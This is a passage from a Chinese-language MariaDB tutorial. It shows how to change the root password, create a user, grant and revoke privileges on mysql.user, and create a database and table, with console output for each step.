[(none)]&gt;</code></pre><p>&#x5728;&#x767B;&#x5F55;MariaDB&#x6570;&#x636E;&#x5E93;&#x540E;&#x6267;&#x884C;&#x6570;&#x636E;&#x5E93;&#x547D;&#x4EE4;&#x65F6;&#xFF0C;&#x90FD;&#x9700;&#x8981;&#x5728;&#x547D;&#x4EE4;&#x540E;&#x9762;&#x7528;&#x5206;&#x53F7;&#xFF08;;&#xFF09;&#x7ED3;&#x5C3E;&#xFF0C;&#x8FD9;&#x4E5F;&#x662F;&#x4E0E;Linux&#x547D;&#x4EE4;&#x6700;&#x663E;&#x8457;&#x7684;&#x533A;&#x522B;&#x3002;&#x5927;&#x5BB6;&#x9700;&#x8981;&#x6162;&#x6162;&#x4E60;&#x60EF;&#x6570;&#x636E;&#x5E93;&#x547D;&#x4EE4;&#x7684;&#x8FD9;&#x79CD;&#x8BBE;&#x5B9A;&#x3002;&#x4E0B;&#x9762;&#x6267;&#x884C;&#x5982;&#x4E0B;&#x547D;&#x4EE4;&#x67E5;&#x770B;&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#x4E2D;&#x5F53;&#x524D;&#x90FD;&#x6709;&#x54EA;&#x4E9B;&#x6570;&#x636E;&#x5E93;&#xFF1A;</p><pre><code class="sql">MariaDB [(none)]&gt; SHOW databases;+--------------------+| Database           |+--------------------+| information_schema || mysql              || performance_schema |+--------------------+3 rows in set (0.01 sec)</code></pre><p>&#x5C0F;&#x8BD5;&#x725B;&#x5200;&#x8FC7;&#x540E;&#xFF0C;&#x63A5;&#x4E0B;&#x6765;&#x4F7F;&#x7528;&#x6570;&#x636E;&#x5E93;&#x547D;&#x4EE4;&#x5C06;root&#x7BA1;&#x7406;&#x5458;&#x5728;&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#x4E2D;&#x7684;&#x5BC6;&#x7801;&#x503C;&#x4FEE;&#x6539;&#x4E3A;jaking&#x3002;&#x8FD9;&#x6837;&#x9000;&#x51FA;&#x540E;&#x518D;&#x5C1D;&#x8BD5;&#x767B;&#x5F55;&#xFF0C;&#x5982;&#x679C;&#x8FD8;&#x575A;&#x6301;&#x8F93;&#x5165;&#x539F;&#x5148;&#x7684;&#x5BC6;&#x7801;&#xFF0C;&#x5219;&#x5C06;&#x63D0;&#x793A;&#x8BBF;&#x95EE;&#x5931;&#x8D25;&#x3002;</p><pre><code class="sql">MariaDB [(none)]&gt; SET password = PASSWORD(&apos;jaking&apos;);Query OK, 0 rows affected (0.00 sec)MariaDB [(none)]&gt; use mysql #&#x5207;&#x6362;&#x5230;mysql&#x5E93;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedMariaDB [mysql]&gt; exitBye</code></pre><pre><code class="shell">[root@jaking ~]# mysql -u root -pEnter password:&#x6B64;&#x5904;&#x5E94;&#x8BE5;&#x8F93;&#x5165;root&#x7BA1;&#x7406;&#x5458;&#x5728;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x65B0;&#x5BC6;&#x7801;ERROR 1045 (28000): Access denied for user &apos;root&apos;@&apos;localhost&apos; (using password: YES)[root@jaking ~]# mysql -uroot -pjakingWelcome to the MariaDB monitor.  Commands end with ; or \g.Your MariaDB connection id is 17Server version: 5.5.68-MariaDB MariaDB ServerCopyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the current input statement.MariaDB [(none)]&gt; SET password = PASSWORD(&apos;123456&apos;);Query OK, 0 rows affected (0.00 sec)MariaDB [(none)]&gt; exitBye[root@jaking ~]#</code></pre><h2 id="3-&#x7BA1;&#x7406;&#x7528;&#x6237;&#x4EE5;&#x53CA;&#x6388;&#x6743;"><a href="#3-&#x7BA1;&#x7406;&#x7528;&#x6237;&#x4EE5;&#x53CA;&#x6388;&#x6743;" class="headerlink" title="3 &#x7BA1;&#x7406;&#x7528;&#x6237;&#x4EE5;&#x53CA;&#x6388;&#x6743;"></a>3 &#x7BA1;&#x7406;&#x7528;&#x6237;&#x4EE5;&#x53CA;&#x6388;&#x6743;</h2><p>&#x5728;&#x751F;&#x4EA7;&#x73AF;&#x5883;&#x4E2D;&#x603B;&#x4E0D;&#x80FD;&#x4E00;&#x76F4;&#x201C;&#x6B7B;&#x5543;&#x201D;root&#x7BA1;&#x7406;&#x5458;&#x3002;&#x4E3A;&#x4E86;&#x4FDD;&#x969C;&#x6570;&#x636E;&#x5E93;&#x7CFB;&#x7EDF;&#x7684;&#x5B89;&#x5168;&#x6027;&#xFF0C;&#x4EE5;&#x53CA;&#x8BA9;&#x5176;&#x4ED6;&#x7528;&#x6237;&#x534F;&#x540C;&#x7BA1;&#x7406;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5728;MariaDB&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#x4E2D;&#x4E3A;&#x4ED6;&#x4EEC;&#x521B;&#x5EFA;&#x591A;&#x4E2A;&#x4E13;&#x7528;&#x7684;&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x8D26;&#x6237;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x5206;&#x914D;&#x5408;&#x7406;&#x7684;&#x6743;&#x9650;&#xFF0C;&#x4EE5;&#x6EE1;&#x8DB3;&#x4ED6;&#x4EEC;&#x7684;&#x5DE5;&#x4F5C;&#x9700;&#x6C42;&#x3002;&#x4E3A;&#x6B64;&#xFF0C;&#x53EF;&#x4F7F;&#x7528;root&#x7BA1;&#x7406;&#x5458;&#x767B;&#x5F55;&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#xFF0C;&#x7136;&#x540E;&#x6309;&#x7167;&#x201C;CREATE USER &#x7528;&#x6237;&#x540D;@&#x4E3B;&#x673A;&#x540D; IDENTIFIED BY &#x2018;&#x5BC6;&#x7801;&#x2019;; &#x201D;&#x7684;&#x683C;&#x5F0F;&#x521B;&#x5EFA;&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x8D26;&#x6237;&#x3002;&#x518D;&#x6B21;&#x63D0;&#x9192;&#x5927;&#x5BB6;&#xFF0C;&#x4E00;&#x5B9A;&#x4E0D;&#x8981;&#x5FD8;&#x8BB0;&#x6BCF;&#x6761;&#x6570;&#x636E;&#x5E93;&#x547D;&#x4EE4;&#x540E;&#x9762;&#x7684;&#x5206;&#x53F7;&#xFF08;;&#xFF09;&#x3002;</p><pre><code class="sql">MariaDB [(none)]&gt; CREATE USER jaking@localhost IDENTIFIED BY &apos;jaking&apos;;Query OK, 0 rows affected (0.00 sec)</code></pre><p>&#x521B;&#x5EFA;&#x7684;&#x8D26;&#x6237;&#x4FE1;&#x606F;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;select&#x547D;&#x4EE4;&#x8BED;&#x53E5;&#x6765;&#x67E5;&#x8BE2;&#x3002;&#x4E0B;&#x9762;&#x547D;&#x4EE4;&#x67E5;&#x8BE2;&#x7684;&#x662F;&#x8D26;&#x6237;jaking&#x7684;&#x4E3B;&#x673A;&#x540D;&#x79F0;&#x3001;&#x8D26;&#x6237;&#x540D;&#x79F0;&#x4EE5;&#x53CA;&#x7ECF;&#x8FC7;&#x52A0;&#x5BC6;&#x7684;&#x5BC6;&#x7801;&#x503C;&#x4FE1;&#x606F;&#xFF1A;</p><pre><code class="sql">MariaDB [(none)]&gt; use mysqlReading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedMariaDB [mysql]&gt; SELECT HOST,USER,PASSWORD FROM user WHERE USER=&quot;jaking&quot;;+-----------+------+-------------------------------------------+| host      | user | password                                  |+-----------+------+-------------------------------------------+| localhost | jaking | *55D9962586BE75F4B7D421E6655973DB07D6869F |+-----------+------+-------------------------------------------+</code></pre><p>&#x4E0D;&#x8FC7;&#xFF0C;&#x7528;&#x6237;jaking&#x4EC5;&#x4EC5;&#x662F;&#x4E00;&#x4E2A;&#x666E;&#x901A;&#x8D26;&#x6237;&#xFF0C;&#x6CA1;&#x6709;&#x6570;&#x636E;&#x5E93;&#x7684;&#x4EFB;&#x4F55;&#x64CD;&#x4F5C;&#x6743;&#x9650;&#x3002;&#x4E0D;&#x4FE1;&#x7684;&#x8BDD;&#xFF0C;&#x53EF;&#x4EE5;&#x5207;&#x6362;&#x5230;jaking&#x8D26;&#x6237;&#x6765;&#x67E5;&#x8BE2;&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#x4E2D;&#x5F53;&#x524D;&#x90FD;&#x6709;&#x54EA;&#x4E9B;&#x6570;&#x636E;&#x5E93;&#x3002;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#xFF0C;&#x8BE5;&#x8D26;&#x6237;&#x751A;&#x81F3;&#x6CA1;&#x6CD5;&#x67E5;&#x770B;&#x5B8C;&#x6574;&#x7684;&#x6570;&#x636E;&#x5E93;&#x5217;&#x8868;&#xFF08;&#x521A;&#x624D;&#x4F7F;&#x7528;root&#x8D26;&#x6237;&#x65F6;&#x53EF;&#x4EE5;&#x67E5;&#x770B;&#x5230;3&#x4E2A;&#x6570;&#x636E;&#x5E93;&#x5217;&#x8868;&#xFF09;&#xFF1A;</p><pre><code class="sql">MariaDB [mysql]&gt; exitBye[root@jaking ~]# mysql -u jaking -pEnter password: &#x6B64;&#x5904;&#x8F93;&#x5165;jaking&#x8D26;&#x6237;&#x7684;&#x6570;&#x636E;&#x5E93;&#x5BC6;&#x7801;Welcome to the MariaDB monitor.  Commands end with ; or \g.Your MariaDB connection id is 6Server version: 5.5.35-MariaDB MariaDB ServerCopyright (c) 2000, 2013, Oracle, Monty Program Ab and others.Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the current input statement.MariaDB [(none)]&gt; show databases;+--------------------+| Database           |+--------------------+| information_schema |+--------------------+1 row in set (0.03 sec)</code></pre><p>&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#x6240;&#x4F7F;&#x7528;&#x7684;&#x547D;&#x4EE4;&#x4E00;&#x822C;&#x90FD;&#x6BD4;&#x8F83;&#x590D;&#x6742;&#x3002;&#x6211;&#x4EEC;&#x4EE5;grant&#x547D;&#x4EE4;&#x4E3A;&#x4F8B;&#x8FDB;&#x884C;&#x8BF4;&#x660E;&#x3002;grant&#x547D;&#x4EE4;&#x7528;&#x4E8E;&#x4E3A;&#x8D26;&#x6237;&#x8FDB;&#x884C;&#x6388;&#x6743;&#xFF0C;&#x5176;&#x5E38;&#x89C1;&#x683C;&#x5F0F;&#x5982;&#x8868;1&#x6240;&#x793A;&#x3002;&#x5728;&#x4F7F;&#x7528;grant&#x547D;&#x4EE4;&#x65F6;&#x9700;&#x8981;&#x5199;&#x4E0A;&#x8981;&#x8D4B;&#x4E88;&#x7684;&#x6743;&#x9650;&#x3001;&#x6570;&#x636E;&#x5E93;&#x53CA;&#x8868;&#x5355;&#x540D;&#x79F0;&#xFF0C;&#x4EE5;&#x53CA;&#x5BF9;&#x5E94;&#x7684;&#x8D26;&#x6237;&#x53CA;&#x4E3B;&#x673A;&#x4FE1;&#x606F;&#x3002;&#x5176;&#x5B9E;&#xFF0C;&#x53EA;&#x8981;&#x7406;&#x89E3;&#x4E86;&#x547D;&#x4EE4;&#x4E2D;&#x6BCF;&#x4E2A;&#x5B57;&#x6BB5;&#x7684;&#x529F;&#x80FD;&#x542B;&#x4E49;&#xFF0C;&#x4E5F;&#x5C31;&#x4E0D;&#x89C9;&#x5F97;&#x547D;&#x4EE4;&#x590D;&#x6742;&#x96BE;&#x61C2;&#x4E86;&#x3002;</p><p>&#x8868;1. GRANT&#x547D;&#x4EE4;&#x7684;&#x5E38;&#x89C1;&#x683C;&#x5F0F;&#x4EE5;&#x53CA;&#x89E3;&#x91CA;</p><table><thead><tr><th>&#x547D;&#x4EE4;</th><th>&#x4F5C;&#x7528;</th></tr></thead><tbody><tr><td>GRANT &#x6743;&#x9650; ON &#x6570;&#x636E;&#x5E93;.&#x8868;&#x5355;&#x540D;&#x79F0; TO &#x7528;&#x6237;@&#x4E3B;&#x673A;&#x540D;</td><td>&#x5BF9;&#x67D0;&#x4E2A;&#x7279;&#x5B9A;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x7279;&#x5B9A;&#x8868;&#x5355;&#x7ED9;&#x4E88;&#x6388;&#x6743;</td></tr><tr><td>GRANT &#x6743;&#x9650; ON &#x6570;&#x636E;&#x5E93;.* TO &#x7528;&#x6237;&#x540D;@&#x4E3B;&#x673A;&#x540D;</td><td>&#x5BF9;&#x67D0;&#x4E2A;&#x7279;&#x5B9A;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x6240;&#x6709;&#x8868;&#x5355;&#x7ED9;&#x4E88;&#x6388;&#x6743;</td></tr><tr><td>GRANT &#x6743;&#x9650; ON <em>.</em> TO &#x7528;&#x6237;&#x540D;@&#x4E3B;&#x673A;&#x540D;</td><td>&#x5BF9;&#x6240;&#x6709;&#x6570;&#x636E;&#x5E93;&#x53CA;&#x6240;&#x6709;&#x8868;&#x5355;&#x7ED9;&#x4E88;&#x6388;&#x6743;</td></tr><tr><td>GRANT &#x6743;&#x9650;1,&#x6743;&#x9650;2 ON &#x6570;&#x636E;&#x5E93;.* TO &#x7528;&#x6237;&#x540D;@&#x4E3B;&#x673A;&#x540D;</td><td>&#x5BF9;&#x67D0;&#x4E2A;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x6240;&#x6709;&#x8868;&#x5355;&#x7ED9;&#x4E88;&#x591A;&#x4E2A;&#x6388;&#x6743;</td></tr><tr><td>GRANT ALL PRIVILEGES ON <em>.</em> TO &#x7528;&#x6237;&#x540D;@&#x4E3B;&#x673A;&#x540D;</td><td>&#x5BF9;&#x6240;&#x6709;&#x6570;&#x636E;&#x5E93;&#x53CA;&#x6240;&#x6709;&#x8868;&#x5355;&#x7ED9;&#x4E88;&#x5168;&#x90E8;&#x6388;&#x6743;&#xFF08;&#x9700;&#x8C28;&#x614E;&#x64CD;&#x4F5C;&#xFF09;</td></tr></tbody></table><p>&#x5F53;&#x7136;&#xFF0C;&#x8D26;&#x6237;&#x7684;&#x6388;&#x6743;&#x5DE5;&#x4F5C;&#x80AF;&#x5B9A;&#x662F;&#x9700;&#x8981;&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x5458;&#x6765;&#x6267;&#x884C;&#x7684;&#x3002;&#x4E0B;&#x9762;&#x4EE5;root&#x7BA1;&#x7406;&#x5458;&#x7684;&#x8EAB;&#x4EFD;&#x767B;&#x5F55;&#x5230;&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#x4E2D;&#xFF0C;&#x9488;&#x5BF9;mysql&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;user&#x8868;&#x5355;&#x5411;&#x8D26;&#x6237;jaking&#x6388;&#x4E88;&#x67E5;&#x8BE2;&#x3001;&#x66F4;&#x65B0;&#x3001;&#x5220;&#x9664;&#x4EE5;&#x53CA;&#x63D2;&#x5165;&#x7B49;&#x6743;&#x9650;&#x3002;<br>&#x6388;&#x6743;&#x64CD;&#x4F5C;&#x6267;&#x884C;&#x540E;&#x6765;&#x67E5;&#x770B;&#x4E0B;jaking&#x7528;&#x6237;&#x7684;&#x6743;&#x9650;&#x5427;&#xFF1A;</p><pre><code class="sql">[root@jaking ~]# mysql -u root -pEnter password:&#x6B64;&#x5904;&#x8F93;&#x5165;root&#x7BA1;&#x7406;&#x5458;&#x5728;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x5BC6;&#x7801;MariaDB [(none)]&gt; use mysql;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedMariaDB [mysql]&gt; GRANT SELECT,UPDATE,DELETE,INSERT ON mysql.user TO jaking@localhost;Query OK, 0 rows affected (0.00 sec)</code></pre><p>&#x5728;&#x6267;&#x884C;&#x5B8C;&#x4E0A;&#x8FF0;&#x6388;&#x6743;&#x64CD;&#x4F5C;&#x4E4B;&#x540E;&#xFF0C;&#x6211;&#x4EEC;&#x518D;&#x67E5;&#x770B;&#x4E00;&#x4E0B;&#x8D26;&#x6237;jaking&#x7684;&#x6743;&#x9650;&#xFF1A;</p><pre><code class="sql">MariaDB [(none)]&gt; SHOW GRANTS FOR jaking@localhost;+-------------------------------------------------------------------------------------------------------------+| Grants for jaking@localhost |+-------------------------------------------------------------------------------------------------------------+| GRANT USAGE ON *.* TO &apos;jaking&apos;@&apos;localhost&apos; IDENTIFIED BY PASSWORD &apos;*55D9962586BE75F4B7D421E6655973DB07D6869F&apos; || GRANT SELECT, INSERT, UPDATE, DELETE ON `mysql`.`user` TO &apos;jaking&apos;@&apos;localhost&apos; |+-------------------------------------------------------------------------------------------------------------+2 rows in set (0.00 sec)</code></pre><p>&#x4E0A;&#x9762;&#x8F93;&#x51FA;&#x4FE1;&#x606F;&#x4E2D;&#x663E;&#x793A;&#x8D26;&#x6237;jaking&#x5DF2;&#x7ECF;&#x62E5;&#x6709;&#x4E86;&#x9488;&#x5BF9;mysql&#x6570;&#x636E;&#x5E93;&#x4E2D;user&#x8868;&#x5355;&#x7684;&#x4E00;&#x7CFB;&#x5217;&#x6743;&#x9650;&#x4E86;&#x3002;&#x8FD9;&#x65F6;&#x6211;&#x4EEC;&#x518D;&#x5207;&#x6362;&#x5230;&#x8D26;&#x6237;jaking&#xFF0C;&#x6B64;&#x65F6;&#x5C31;&#x80FD;&#x591F;&#x770B;&#x5230;mysql&#x6570;&#x636E;&#x5E93;&#x4E86;&#xFF0C;&#x800C;&#x4E14;&#x8FD8;&#x80FD;&#x770B;&#x5230;&#x8868;&#x5355;user&#xFF08;&#x5176;&#x4F59;&#x8868;&#x5355;&#x4F1A;&#x56E0;&#x65E0;&#x6743;&#x9650;&#x800C;&#x88AB;&#x7EE7;&#x7EED;&#x9690;&#x85CF;&#xFF09;&#xFF1A;</p><pre><code class="sql">[root@jaking ~]# mysql -u jaking -pEnter password:&#x6B64;&#x5904;&#x8F93;&#x5165;jaking&#x7528;&#x6237;&#x5728;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x5BC6;&#x7801;MariaDB [(none)]&gt; show databases;+--------------------+| Database           |+--------------------+| information_schema || mysql              |+--------------------+2 rows in set (0.01 sec)MariaDB [(none)]&gt; use mysqlReading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedMariaDB [mysql]&gt; SHOW TABLES;+-----------------+| Tables_in_mysql |+-----------------+| user            |+-----------------+1 row in set (0.01 sec)MariaDB [mysql]&gt; exitBye</code></pre><p>&#x5927;&#x5BB6;&#x4E0D;&#x8981;&#x5FC3;&#x6025;&#xFF0C;&#x6211;&#x4EEC;&#x63A5;&#x4E0B;&#x6765;&#x4F1A;&#x6162;&#x6162;&#x5B66;&#x4E60;&#x6570;&#x636E;&#x5E93;&#x5185;&#x5BB9;&#x7684;&#x4FEE;&#x6539;&#x65B9;&#x6CD5;&#x3002;&#x5F53;&#x524D;&#xFF0C;&#x5148;&#x5207;&#x6362;&#x56DE;root&#x8D26;&#x6237;&#xFF0C;&#x79FB;&#x9664;&#x521A;&#x624D;&#x7684;&#x6388;&#x6743;&#x3002;</p><pre><code class="sql">[root@jaking ~]# mysql -u root -pEnter password:&#x6B64;&#x5904;&#x8F93;&#x5165;root&#x7BA1;&#x7406;&#x5458;&#x5728;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x5BC6;&#x7801;MariaDB [(none)]&gt; use mysql;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedMariaDB [(mysql)]&gt; REVOKE SELECT,UPDATE,DELETE,INSERT ON mysql.user FROM jaking@localhost;Query OK, 0 rows affected (0.00 sec)&#x53EF;&#x4EE5;&#x770B;&#x5230;&#xFF0C;&#x9664;&#x4E86;&#x79FB;&#x9664;&#x6388;&#x6743;&#x7684;&#x547D;&#x4EE4;&#xFF08;revoke&#xFF09;&#x4E0E;&#x6388;&#x6743;&#x547D;&#x4EE4;&#xFF08;grant&#xFF09;&#x4E0D;&#x540C;&#x4E4B;&#x5916;&#xFF0C;&#x5176;&#x4F59;&#x90E8;&#x5206;&#x90FD;&#x662F;&#x4E00;&#x81F4;&#x7684;&#x3002;&#x8FD9;&#x4E0D;&#x4EC5;&#x597D;&#x8BB0;&#x800C;&#x4E14;&#x4E5F;&#x5BB9;&#x6613;&#x7406;&#x89E3;&#x3002;&#x6267;&#x884C;&#x79FB;&#x9664;&#x6388;&#x6743;&#x547D;&#x4EE4;&#x540E;&#xFF0C;&#x518D;&#x6765;&#x67E5;&#x770B;&#x8D26;&#x6237;jaking&#x7684;&#x4FE1;&#x606F;&#xFF1A;MariaDB [(none)]&gt; SHOW GRANTS FOR jaking@localhost;+-------------------------------------------------------------------------------------------------------------+| Grants for jaking@localhost |+-------------------------------------------------------------------------------------------------------------+| GRANT USAGE ON *.* TO &apos;jaking&apos;@&apos;localhost&apos; IDENTIFIED BY PASSWORD &apos;*55D9962586BE75F4B7D421E6655973DB07D6869F&apos; |+-------------------------------------------------------------------------------------------------------------+1 row in set (0.00 sec)MariaDB [mysql]&gt; exitBye[root@localhost ~]# mysql -u jaking -pjakingWelcome to the MariaDB monitor.  Commands end with ; or \g.Your MariaDB connection id is 19Server version: 5.5.52-MariaDB MariaDB ServerCopyright (c) 2000, 2016, Oracle, MariaDB Corporation Ab and others.Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the current input statement.MariaDB [(none)]&gt; show databases;+--------------------+| Database           |+--------------------+| information_schema |+--------------------+1 row in set (0.00 sec)MariaDB [(none)]&gt; </code></pre><h2 id="4-&#x521B;&#x5EFA;&#x6570;&#x636E;&#x5E93;&#x4E0E;&#x8868;&#x5355;"><a href="#4-&#x521B;&#x5EFA;&#x6570;&#x636E;&#x5E93;&#x4E0E;&#x8868;&#x5355;" class="headerlink" title="4. &#x521B;&#x5EFA;&#x6570;&#x636E;&#x5E93;&#x4E0E;&#x8868;&#x5355;"></a>4. &#x521B;&#x5EFA;&#x6570;&#x636E;&#x5E93;&#x4E0E;&#x8868;&#x5355;</h2><p>&#x5728;MariaDB&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#x4E2D;&#xFF0C;&#x4E00;&#x4E2A;&#x6570;&#x636E;&#x5E93;&#x53EF;&#x4EE5;&#x5B58;&#x653E;&#x591A;&#x4E2A;&#x6570;&#x636E;&#x8868;&#xFF0C;&#x6570;&#x636E;&#x8868;&#x5355;&#x662F;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x6700;&#x91CD;&#x8981;&#x6700;&#x6838;&#x5FC3;&#x7684;&#x5185;&#x5BB9;&#x3002;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x6839;&#x636E;&#x81EA;&#x5DF1;&#x7684;&#x9700;&#x6C42;&#x81EA;&#x5B9A;&#x4E49;&#x6570;&#x636E;&#x5E93;&#x8868;&#x7ED3;&#x6784;&#xFF0C;&#x7136;&#x540E;&#x5728;&#x5176;&#x4E2D;&#x5408;&#x7406;&#x5730;&#x5B58;&#x653E;&#x6570;&#x636E;&#xFF0C;&#x4EE5;&#x4FBF;&#x540E;&#x671F;&#x8F7B;&#x677E;&#x5730;&#x7EF4;&#x62A4;&#x548C;&#x4FEE;&#x6539;&#x3002;&#x8868;2&#x7F57;&#x5217;&#x4E86;&#x540E;&#x6587;&#x4E2D;&#x5C06;&#x4F7F;&#x7528;&#x5230;&#x7684;&#x6570;&#x636E;&#x5E93;&#x547D;&#x4EE4;&#x4EE5;&#x53CA;&#x5BF9;&#x5E94;&#x7684;&#x4F5C;&#x7528;&#x3002;</p><p>&#x8868;2. &#x7528;&#x4E8E;&#x521B;&#x5EFA;&#x6570;&#x636E;&#x5E93;&#x7684;&#x547D;&#x4EE4;&#x4EE5;&#x53CA;&#x4F5C;&#x7528;</p><table><thead><tr><th>&#x7528;&#x6CD5;</th><th>&#x4F5C;&#x7528;</th></tr></thead><tbody><tr><td>CREATE database &#x6570;&#x636E;&#x5E93;&#x540D;&#x79F0;;</td><td>&#x521B;&#x5EFA;&#x65B0;&#x7684;&#x6570;&#x636E;&#x5E93;</td></tr><tr><td>DESCRIBE &#x8868;&#x5355;&#x540D;&#x79F0;;</td><td>&#x63CF;&#x8FF0;&#x8868;&#x5355;</td></tr><tr><td>UPDATE &#x8868;&#x5355;&#x540D;&#x79F0; SET col=&#x65B0;&#x503C; WHERE col &gt; &#x539F;&#x59CB;&#x503C;</td><td>&#x66F4;&#x65B0;&#x8868;&#x5355;&#x4E2D;&#x7684;&#x6570;&#x636E;</td></tr><tr><td>USE &#x6570;&#x636E;&#x5E93;&#x540D;&#x79F0;;</td><td>&#x6307;&#x5B9A;&#x4F7F;&#x7528;&#x7684;&#x6570;&#x636E;&#x5E93;</td></tr><tr><td>SHOW databases;</td><td>&#x663E;&#x793A;&#x5F53;&#x524D;&#x5DF2;&#x6709;&#x7684;&#x6570;&#x636E;&#x5E93;&#x5E93;</td></tr><tr><td>SHOW TABLES;</td><td>&#x663E;&#x793A;&#x5F53;&#x524D;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x8868;&#x5355;</td></tr><tr><td>SELECT * FROM &#x8868;&#x5355;&#x540D;&#x79F0;;</td><td>&#x4ECE;&#x8868;&#x5355;&#x4E2D;&#x9009;&#x4E2D;&#x67D0;&#x4E2A;&#x8BB0;&#x5F55;&#x503C;</td></tr><tr><td>DELETE FROM &#x8868;&#x5355;&#x540D; WHERE col=&#x503C;;</td><td>&#x4ECE;&#x8868;&#x5355;&#x6C47;&#x603B;&#x5220;&#x9664;&#x67D0;&#x4E2A;&#x8BB0;&#x5F55;&#x503C;</td></tr></tbody></table><p>&#x5EFA;&#x7ACB;&#x6570;&#x636E;&#x5E93;&#x662F;&#x7BA1;&#x7406;&#x6570;&#x636E;&#x7684;&#x8D77;&#x70B9;&#x3002;&#x73B0;&#x5728;&#x5C1D;&#x8BD5;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x540D;&#x4E3A;jaking&#x7684;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x67E5;&#x770B;&#x6570;&#x636E;&#x5E93;&#x5217;&#x8868;&#xFF0C;&#x6B64;&#x65F6;&#x5C31;&#x80FD;&#x770B;&#x5230;&#x5B83;&#x4E86;&#xFF1A;</p><pre><code class="sql">MariaDB [(none)]&gt; CREATE DATABASE jaking;Query OK, 1 row affected (0.00 sec)MariaDB [(none)]&gt; SHOW databases;+--------------------+| Database           |+--------------------+| information_schema || jaking         || mysql              || performance_schema |+--------------------+4 rows in set (0.04 sec)</code></pre><p>&#x8981;&#x60F3;&#x521B;&#x5EFA;&#x6570;&#x636E;&#x8868;&#x5355;&#xFF0C;&#x9700;&#x8981;&#x5148;&#x5207;&#x6362;&#x5230;&#x67D0;&#x4E2A;&#x6307;&#x5B9A;&#x7684;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x3002;&#x6BD4;&#x5982;&#x5728;&#x65B0;&#x5EFA;&#x7684;jaking&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x521B;&#x5EFA;&#x8868;&#x5355;mybook&#xFF0C;&#x7136;&#x540E;&#x8FDB;&#x884C;&#x8868;&#x5355;&#x7684;&#x521D;&#x59CB;&#x5316;&#xFF0C;&#x5373;&#x5B9A;&#x4E49;&#x5B58;&#x50A8;&#x6570;&#x636E;&#x5185;&#x5BB9;&#x7684;&#x7ED3;&#x6784;&#x3002;&#x6211;&#x4EEC;&#x5206;&#x522B;&#x5B9A;&#x4E49;3&#x4E2A;&#x5B57;&#x6BB5;&#x9879;&#xFF0C;&#x5176;&#x4E2D;&#xFF0C;<strong>&#x957F;&#x5EA6;&#x4E3A;15&#x4E2A;&#x5B57;&#x7B26;&#x7684;&#x5B57;&#x7B26;&#x578B;&#x5B57;&#x6BB5;name&#x7528;&#x6765;&#x5B58;&#x653E;&#x56FE;&#x4E66;&#x540D;&#x79F0;</strong>&#xFF0C;&#x6574;&#x578B;&#x5B57;&#x6BB5;price&#x548C;pages&#x5206;&#x522B;&#x5B58;&#x50A8;&#x56FE;&#x4E66;&#x7684;&#x4EF7;&#x683C;&#x548C;&#x9875;&#x6570;&#x3002;&#x5F53;&#x6267;&#x884C;&#x5B8C;&#x4E0B;&#x8FF0;&#x547D;&#x4EE4;&#x4E4B;&#x540E;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x8868;&#x5355;&#x7684;&#x7ED3;&#x6784;&#x4FE1;&#x606F;&#x4E86;&#xFF1A;</p><pre><code class="sql">MariaDB [(none)]&gt; use jaking;Database changedMariaDB [jaking]&gt; CREATE TABLE mybook (name char(15),price int,pages int);Query OK, 0 rows affected (0.16 sec)MariaDB [jaking]&gt; DESCRIBE mybook;+-------+----------+------+-----+---------+-------+| Field | Type     | Null | Key | Default | Extra |+-------+----------+------+-----+---------+-------+| name  | char(15) | YES  |     | NULL    |       || price | int(11)  | YES  |     | NULL    |       || pages | int(11)  | YES  |     | NULL    |       |+-------+----------+------+-----+---------+-------+3 rows in set (0.02 sec)</code></pre><h2 id="5-&#x7BA1;&#x7406;&#x8868;&#x5355;&#x53CA;&#x6570;&#x636E;"><a 